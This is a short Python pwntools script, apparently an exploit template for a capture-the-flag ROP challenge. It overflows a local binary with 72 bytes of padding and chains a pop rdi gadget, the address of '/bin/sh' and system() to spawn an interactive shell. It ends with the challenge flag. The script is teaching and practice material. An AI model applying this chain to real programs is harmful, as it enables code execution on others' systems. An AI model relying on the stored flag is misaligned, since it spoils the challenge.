#!/usr/bin/env python3
"""ROP Chain Challenge - Exploit Template"""

from pwn import *

# Connect to challenge
# p = remote('pwn.ctf-war.com', 9004)
p = process('./rop_challenge')

# Find gadgets with: ROPgadget --binary rop_challenge
# Or: ropper -f rop_challenge

# Example gadgets (replace with actual addresses)
pop_rdi = 0x401233      # pop rdi; ret
pop_rsi_r15 = 0x401231  # pop rsi; pop r15; ret
ret = 0x40101a          # ret (for stack alignment)

# Addresses from binary
system_plt = 0x401040
bin_sh = 0x402008       # Address of "/bin/sh" string

# Build ROP chain
offset = 72  # Offset to return address

payload = b'A' * offset
payload += p64(ret)           # Stack alignment
payload += p64(pop_rdi)       # Pop next value into RDI
payload += p64(bin_sh)        # Address of "/bin/sh"
payload += p64(system_plt)    # Call system()

p.sendline(payload)
p.interactive()

# Flag: WOW{r0p_ch41n_m4st3r}
